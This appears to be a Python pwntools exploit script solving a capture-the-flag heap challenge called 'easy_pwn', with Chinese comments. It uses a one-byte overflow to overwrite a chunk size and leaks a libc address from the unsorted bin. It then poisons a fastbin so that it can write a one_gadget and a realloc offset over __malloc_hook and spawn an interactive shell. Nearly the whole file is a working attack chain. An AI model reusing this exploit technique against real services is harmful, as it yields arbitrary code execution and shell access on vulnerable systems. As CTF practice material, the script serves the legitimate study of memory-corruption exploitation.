from pwn import *
from LibcSearcher import *
from utils import log,show_ida_patch,nan
from loader import Loader
from pwnlib.util.proc import wait_for_debugger
from struct import pack
from qwq import *
import os
loader = Loader("target/easy_pwn", 64)
loader.patchElf()
# loader.debug()

log = nan
if 1:
    @log
    def ru(x): return io.recvuntil(x)
    @log
    def rl(): return io.recvline()
    @log
    def sla(x, y): return io.sendlineafter(x, y)
    @log
    def sl(x): return io.sendline(x)
    @log
    def s(x): return io.send(x)
    @log
    def sa(x, y): return io.sendafter(x, y)
    def psize(x): return loader.psize(x)
    def shell(): io.interactive()
    def bt(s): return bytes(str(s),encoding='utf-8')
# io = process(loader.root,stdin=PTY)
# wait_for_debugger(io.pid)

io = loader.process(0)
# io = loader.remote(27297)
os.system(f'echo "att {io.pid}" | clip.exe')
elf = loader.elf
# loader.patchElf()


def main():
    def add(size):
        sla(b'choice: ',b'1')
        # print(size.b())
        sla(b'size: ',bt(size))

    def edit(id,size,payload):
        sla(b'choice: ',b'2')
        sla(b'index: ',bt(id))
        sla(b"size", bt(size))
        sla(b'content', payload)

    def delete(id):
        sla(b'choice: ',b'3')
        sla(b'index: ',bt(id))

    def show(id):
        sla(b'choice: ',b'4')
        sla(b'index: ',bt(id))

    add(0x58)#0
    add(0x60)#1
    add(0x60)#2
    add(0x60)#3
    add(0x60)#4

    edit(0,0x58+10,b'a'*0x58+b'\xe1')#edit chunk_size
    delete(1)
    add(0x60)#1  这里触发unsorted bin的分割操作
    show(2)
    io.recvuntil(b'content: ')
    malloc_hook=u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))-88-0x10
    print(hex(malloc_hook))
    
    obj = LibcSearcher('__malloc_hook',malloc_hook)
    libc_base = malloc_hook - obj.dump('__malloc_hook')
    realloc = libc_base + obj.dump('__libc_realloc')
    one_gadget=libc_base+0x4526a
    print("one_gadget: "+hex(one_gadget))
    
    # pause()
    
    add(0x60)#5 #2
    delete(2) # 进入fastbin
    # pause()
    edit(5,0x8,p64(malloc_hook-0x23)) # 把bin里面的trnuk的fd改成 fake_trunk
    # fastbin : trunk_2_deleted => malloc_hook-0x23(fake_trunk) => invalid
    add(0x60)
    # pause()
    add(0x60) # 6
    # 拿malloc-0x23(fake)是为了向malloc_hook中放入one_gadget
    # 但是one_gadget不是随便就能用的，不满足限制条件的话就需要借助realloc_hook
    payload = b"\x00"*11 + p64(one_gadget)+ p64(realloc+2)
    edit(6,len(payload),payload)
    pause()
    add(255)

    shell()
    
    
    
if __name__ == "__main__":
    main()